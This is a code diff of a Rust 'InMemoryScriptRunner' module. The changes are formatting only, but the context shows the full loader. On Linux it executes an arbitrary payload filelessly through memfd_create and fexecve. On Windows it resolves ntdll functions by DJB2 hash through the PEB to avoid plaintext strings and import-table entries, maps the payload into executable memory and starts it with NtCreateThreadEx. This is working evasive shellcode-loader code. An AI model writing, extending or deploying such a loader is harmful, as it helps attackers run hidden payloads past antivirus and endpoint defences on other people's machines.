@@ -101,10 +101,7 @@ impl InMemoryScriptRunner {
 mod platform {
     use super::*;
 
-    pub fn run(
-        payload: &[u8],
-        env: &HashMap<String, String>,
-    ) -> InMemoryExecutionResult<String> {
+    pub fn run(payload: &[u8], env: &HashMap<String, String>) -> InMemoryExecutionResult<String> {
         #[cfg(target_os = "linux")]
         return linux::run(payload, env);
 
@@ -132,11 +129,7 @@ mod linux {
 
     extern "C" {
         fn memfd_create(name: *const c_char, flags: c_uint) -> c_int;
-        fn fexecve(
-            fd: c_int,
-            argv: *const *const c_char,
-            envp: *const *const c_char,
-        ) -> c_int;
+        fn fexecve(fd: c_int, argv: *const *const c_char, envp: *const *const c_char) -> c_int;
         fn close(fd: c_int) -> c_int;
         fn __errno_location() -> *mut c_int;
     }
@@ -147,10 +140,7 @@ mod linux {
         unsafe { *__errno_location() }
     }
 
-    pub fn run(
-        payload: &[u8],
-        env: &HashMap<String, String>,
-    ) -> InMemoryExecutionResult<String> {
+    pub fn run(payload: &[u8], env: &HashMap<String, String>) -> InMemoryExecutionResult<String> {
         // Step 1 — anonymous in-memory fd (never appears in filesystem)
         let fd = unsafe { memfd_create(b"\0".as_ptr() as *const c_char, MFD_CLOEXEC) };
         if fd < 0 {
@@ -164,9 +154,7 @@ mod linux {
         {
             let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
             file.write_all(payload).map_err(|e| {
-                InMemoryExecutionError::ExecutionFailed(format!(
-                    "write to memfd failed: {e}"
-                ))
+                InMemoryExecutionError::ExecutionFailed(format!("write to memfd failed: {e}"))
             })?;
             file.seek(SeekFrom::Start(0)).map_err(|e| {
                 InMemoryExecutionError::ExecutionFailed(format!("seek on memfd failed: {e}"))
@@ -183,8 +171,7 @@ mod linux {
             .iter()
             .filter_map(|(k, v)| std::ffi::CString::new(format!("{k}={v}")).ok())
             .collect();
-        let mut envp: Vec<*const c_char> =
-            env_cstrings.iter().map(|s| s.as_ptr()).collect();
+        let mut envp: Vec<*const c_char> = env_cstrings.iter().map(|s| s.as_ptr()).collect();
         envp.push(std::ptr::null());
 
         // Step 4 — fexecve: exec from fd, not from any named path
@@ -217,7 +204,9 @@ mod linux {
         unsafe { memfd_create(b"\0".as_ptr() as *const c_char, MFD_CLOEXEC) }
     }
     pub fn close_memfd(fd: c_int) {
-        unsafe { close(fd); }
+        unsafe {
+            close(fd);
+        }
     }
     pub fn last_errno() -> i32 {
         errno()
@@ -234,48 +223,47 @@ mod windows {
     use std::ptr;
 
     // Pre-computed DJB2 hashes (compile-time) — no plaintext strings in binary
-    const NTDLL_HASH:         u32 = djb2_hash(b"ntdll.dll");
-    const H_CREATE_SECTION:   u32 = djb2_hash(b"NtCreateSection");
-    const H_MAP_VIEW:         u32 = djb2_hash(b"NtMapViewOfSection");
-    const H_PROTECT:          u32 = djb2_hash(b"NtProtectVirtualMemory");
-    const H_CREATE_THREAD:    u32 = djb2_hash(b"NtCreateThreadEx");
-    const H_WAIT:             u32 = djb2_hash(b"NtWaitForSingleObject");
-    const H_UNMAP:            u32 = djb2_hash(b"NtUnmapViewOfSection");
-    const H_CLOSE:            u32 = djb2_hash(b"NtClose");
+    const NTDLL_HASH: u32 = djb2_hash(b"ntdll.dll");
+    const H_CREATE_SECTION: u32 = djb2_hash(b"NtCreateSection");
+    const H_MAP_VIEW: u32 = djb2_hash(b"NtMapViewOfSection");
+    const H_PROTECT: u32 = djb2_hash(b"NtProtectVirtualMemory");
+    const H_CREATE_THREAD: u32 = djb2_hash(b"NtCreateThreadEx");
+    const H_WAIT: u32 = djb2_hash(b"NtWaitForSingleObject");
+    const H_UNMAP: u32 = djb2_hash(b"NtUnmapViewOfSection");
+    const H_CLOSE: u32 = djb2_hash(b"NtClose");
 
-    type HANDLE   = *mut c_void;
-    type PVOID    = *mut c_void;
+    type HANDLE = *mut c_void;
+    type PVOID = *mut c_void;
     type NTSTATUS = u32;
 
-    const STATUS_SUCCESS:          NTSTATUS = 0x00000000;
-    const SECTION_ALL_ACCESS:      u32      = 0x0F001F;
-    const PAGE_EXECUTE_READWRITE:  u32      = 0x40;
-    const PAGE_EXECUTE_READ:       u32      = 0x20;
-    const SEC_COMMIT:              u32      = 0x08000000;
-    const CURRENT_PROCESS:         HANDLE   = -1isize as HANDLE;
+    const STATUS_SUCCESS: NTSTATUS = 0x00000000;
+    const SECTION_ALL_ACCESS: u32 = 0x0F001F;
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+    const SEC_COMMIT: u32 = 0x08000000;
+    const CURRENT_PROCESS: HANDLE = -1isize as HANDLE;
 
     fn resolve(r: &PebResolver, hash: u32, name: &str) -> InMemoryExecutionResult<usize> {
         r.resolve_by_hash(NTDLL_HASH, hash)
             .map(|f| f.0)
-            .ok_or_else(|| InMemoryExecutionError::ExecutionFailed(
-                format!("PEB resolution failed for {name} ({hash:#010x})")
-            ))
+            .ok_or_else(|| {
+                InMemoryExecutionError::ExecutionFailed(format!(
+                    "PEB resolution failed for {name} ({hash:#010x})"
+                ))
+            })
     }
 
-    pub fn run(
-        payload: &[u8],
-        _env: &HashMap<String, String>,
-    ) -> InMemoryExecutionResult<String> {
+    pub fn run(payload: &[u8], _env: &HashMap<String, String>) -> InMemoryExecutionResult<String> {
         let r = PebResolver::new();
 
         // Resolve all NT functions via PEB — no import table entries
-        let fn_create_section  = resolve(&r, H_CREATE_SECTION,  "NtCreateSection")?;
-        let fn_map_view        = resolve(&r, H_MAP_VIEW,         "NtMapViewOfSection")?;
-        let fn_protect         = resolve(&r, H_PROTECT,          "NtProtectVirtualMemory")?;
-        let fn_create_thread   = resolve(&r, H_CREATE_THREAD,    "NtCreateThreadEx")?;
-        let fn_wait            = resolve(&r, H_WAIT,             "NtWaitForSingleObject")?;
-        let fn_unmap           = resolve(&r, H_UNMAP,            "NtUnmapViewOfSection")?;
-        let fn_close           = resolve(&r, H_CLOSE,            "NtClose")?;
+        let fn_create_section = resolve(&r, H_CREATE_SECTION, "NtCreateSection")?;
+        let fn_map_view = resolve(&r, H_MAP_VIEW, "NtMapViewOfSection")?;
+        let fn_protect = resolve(&r, H_PROTECT, "NtProtectVirtualMemory")?;
+        let fn_create_thread = resolve(&r, H_CREATE_THREAD, "NtCreateThreadEx")?;
+        let fn_wait = resolve(&r, H_WAIT, "NtWaitForSingleObject")?;
+        let fn_unmap = resolve(&r, H_UNMAP, "NtUnmapViewOfSection")?;
+        let fn_close = resolve(&r, H_CLOSE, "NtClose")?;
 
         map_and_exec(
             payload,
@@ -291,38 +279,82 @@ mod windows {
 
     fn map_and_exec(
         payload: &[u8],
-        fn_cs: usize, fn_mv: usize, fn_pv: usize,
-        fn_ct: usize, fn_wt: usize, fn_um: usize, fn_cl: usize,
+        fn_cs: usize,
+        fn_mv: usize,
+        fn_pv: usize,
+        fn_ct: usize,
+        fn_wt: usize,
+        fn_um: usize,
+        fn_cl: usize,
     ) -> InMemoryExecutionResult<String> {
         // NT function type aliases
-        type NtCreateSection   = unsafe extern "system" fn(*mut HANDLE, u32, PVOID, *mut i64, u32, u32, HANDLE) -> NTSTATUS;
-        type NtMapView         = unsafe extern "system" fn(HANDLE, HANDLE, *mut PVOID, usize, usize, *mut i64, *mut usize, u32, u32, u32) -> NTSTATUS;
-        type NtProtect         = unsafe extern "system" fn(HANDLE, *mut PVOID, *mut usize, u32, *mut u32) -> NTSTATUS;
-        type NtCreateThread    = unsafe extern "system" fn(*mut HANDLE, u32, PVOID, HANDLE, PVOID, PVOID, u32, usize, usize, usize, PVOID) -> NTSTATUS;
-        type NtWait            = unsafe extern "system" fn(HANDLE, u8, *mut i64) -> NTSTATUS;
-        type NtUnmap           = unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS;
-        type NtClose           = unsafe extern "system" fn(HANDLE) -> NTSTATUS;
+        type NtCreateSection = unsafe extern "system" fn(
+            *mut HANDLE,
+            u32,
+            PVOID,
+            *mut i64,
+            u32,
+            u32,
+            HANDLE,
+        ) -> NTSTATUS;
+        type NtMapView = unsafe extern "system" fn(
+            HANDLE,
+            HANDLE,
+            *mut PVOID,
+            usize,
+            usize,
+            *mut i64,
+            *mut usize,
+            u32,
+            u32,
+            u32,
+        ) -> NTSTATUS;
+        type NtProtect =
+            unsafe extern "system" fn(HANDLE, *mut PVOID, *mut usize, u32, *mut u32) -> NTSTATUS;
+        type NtCreateThread = unsafe extern "system" fn(
+            *mut HANDLE,
+            u32,
+            PVOID,
+            HANDLE,
+            PVOID,
+            PVOID,
+            u32,
+            usize,
+            usize,
+            usize,
+            PVOID,
+        ) -> NTSTATUS;
+        type NtWait = unsafe extern "system" fn(HANDLE, u8, *mut i64) -> NTSTATUS;
+        type NtUnmap = unsafe extern "system" fn(HANDLE, PVOID) -> NTSTATUS;
+        type NtClose = unsafe extern "system" fn(HANDLE) -> NTSTATUS;
 
-        let nt_cs:  NtCreateSection = unsafe { std::mem::transmute(fn_cs) };
-        let nt_mv:  NtMapView       = unsafe { std::mem::transmute(fn_mv) };
-        let nt_pv:  NtProtect       = unsafe { std::mem::transmute(fn_pv) };
-        let nt_ct:  NtCreateThread  = unsafe { std::mem::transmute(fn_ct) };
-        let nt_wt:  NtWait          = unsafe { std::mem::transmute(fn_wt) };
-        let nt_um:  NtUnmap         = unsafe { std::mem::transmute(fn_um) };
-        let nt_cl:  NtClose         = unsafe { std::mem::transmute(fn_cl) };
+        let nt_cs: NtCreateSection = unsafe { std::mem::transmute(fn_cs) };
+        let nt_mv: NtMapView = unsafe { std::mem::transmute(fn_mv) };
+        let nt_pv: NtProtect = unsafe { std::mem::transmute(fn_pv) };
+        let nt_ct: NtCreateThread = unsafe { std::mem::transmute(fn_ct) };
+        let nt_wt: NtWait = unsafe { std::mem::transmute(fn_wt) };
+        let nt_um: NtUnmap = unsafe { std::mem::transmute(fn_um) };
+        let nt_cl: NtClose = unsafe { std::mem::transmute(fn_cl) };
 
         // ── 1. NtCreateSection ──────────────────────────────────────────────
         let mut section_handle: HANDLE = ptr::null_mut();
         let mut section_size: i64 = payload.len() as i64;
 
         let st = unsafe {
-            nt_cs(&mut section_handle, SECTION_ALL_ACCESS, ptr::null_mut(),
-                  &mut section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, ptr::null_mut())
+            nt_cs(
+                &mut section_handle,
+                SECTION_ALL_ACCESS,
+                ptr::null_mut(),
+                &mut section_size,
+                PAGE_EXECUTE_READWRITE,
+                SEC_COMMIT,
+                ptr::null_mut(),
+            )
         };
         if st != STATUS_SUCCESS {
-            return Err(InMemoryExecutionError::ExecutionFailed(
-                format!("NtCreateSection: NTSTATUS {st:#010x}")
-            ));
+            return Err(InMemoryExecutionError::ExecutionFailed(format!(
+                "NtCreateSection: NTSTATUS {st:#010x}"
+            )));
         }
 
         // ── 2. NtMapViewOfSection (RW) ──────────────────────────────────────
@@ -330,14 +362,26 @@ mod windows {
         let mut view_sz: usize = payload.len();
 
         let st = unsafe {
-            nt_mv(section_handle, CURRENT_PROCESS, &mut base, 0, 0,
-                  ptr::null_mut(), &mut view_sz, 1, 0, PAGE_EXECUTE_READWRITE)
+            nt_mv(
+                section_handle,
+                CURRENT_PROCESS,
+                &mut base,
+                0,
+                0,
+                ptr::null_mut(),
+                &mut view_sz,
+                1,
+                0,
+                PAGE_EXECUTE_READWRITE,
+            )
         };
         if st != STATUS_SUCCESS {
-            unsafe { nt_cl(section_handle); }
-            return Err(InMemoryExecutionError::ExecutionFailed(
-                format!("NtMapViewOfSection: NTSTATUS {st:#010x}")
-            ));
+            unsafe {
+                nt_cl(section_handle);
+            }
+            return Err(InMemoryExecutionError::ExecutionFailed(format!(
+                "NtMapViewOfSection: NTSTATUS {st:#010x}"
+            )));
         }
 
         // ── 3. Copy payload into mapped region ──────────────────────────────
@@ -345,24 +389,43 @@ mod windows {
 
         // ── 4. Harden to PAGE_EXECUTE_READ ──────────────────────────────────
         let mut protect_base = base;
-        let mut protect_sz   = payload.len();
+        let mut protect_sz = payload.len();
         let mut old_prot: u32 = 0;
         unsafe {
-            nt_pv(CURRENT_PROCESS, &mut protect_base, &mut protect_sz,
-                  PAGE_EXECUTE_READ, &mut old_prot);
+            nt_pv(
+                CURRENT_PROCESS,
+                &mut protect_base,
+                &mut protect_sz,
+                PAGE_EXECUTE_READ,
+                &mut old_prot,
+            );
         }
 
         // ── 5. NtCreateThreadEx at mapped base ──────────────────────────────
         let mut thread: HANDLE = ptr::null_mut();
         let st = unsafe {
-            nt_ct(&mut thread, 0x1FFFFF, ptr::null_mut(), CURRENT_PROCESS,
-                  base, ptr::null_mut(), 0, 0, 0, 0, ptr::null_mut())
+            nt_ct(
+                &mut thread,
+                0x1FFFFF,
+                ptr::null_mut(),
+                CURRENT_PROCESS,
+                base,
+                ptr::null_mut(),
+                0,
+                0,
+                0,
+                0,
+                ptr::null_mut(),
+            )
         };
         if st != STATUS_SUCCESS {
-            unsafe { nt_um(CURRENT_PROCESS, base); nt_cl(section_handle); }
-            return Err(InMemoryExecutionError::ExecutionFailed(
-                format!("NtCreateThreadEx: NTSTATUS {st:#010x}")
-            ));
+            unsafe {
+                nt_um(CURRENT_PROCESS, base);
+                nt_cl(section_handle);
+            }
+            return Err(InMemoryExecutionError::ExecutionFailed(format!(
+                "NtCreateThreadEx: NTSTATUS {st:#010x}"
+            )));
         }
 
         // ── 6. Wait + 7. Cleanup ─────────────────────────────────────────────
@@ -412,8 +475,14 @@ mod tests {
         let runner = InMemoryScriptRunner::new()
             .with_env("JOCKY_CASE", "test-001")
             .with_env("JOCKY_MODE", "silent");
-        assert_eq!(runner.env.get("JOCKY_CASE").map(String::as_str), Some("test-001"));
-        assert_eq!(runner.env.get("JOCKY_MODE").map(String::as_str), Some("silent"));
+        assert_eq!(
+            runner.env.get("JOCKY_CASE").map(String::as_str),
+            Some("test-001")
+        );
+        assert_eq!(
+            runner.env.get("JOCKY_MODE").map(String::as_str),
+            Some("silent")
+        );
     }
 
     #[test]
@@ -446,7 +515,11 @@ mod tests {
     #[test]
     fn test_memfd_create_syscall_available() {
         let fd = linux::create_memfd();
-        assert!(fd >= 0, "memfd_create failed: errno={}", linux::last_errno());
+        assert!(
+            fd >= 0,
+            "memfd_create failed: errno={}",
+            linux::last_errno()
+        );
         linux::close_memfd(fd);
     }
 
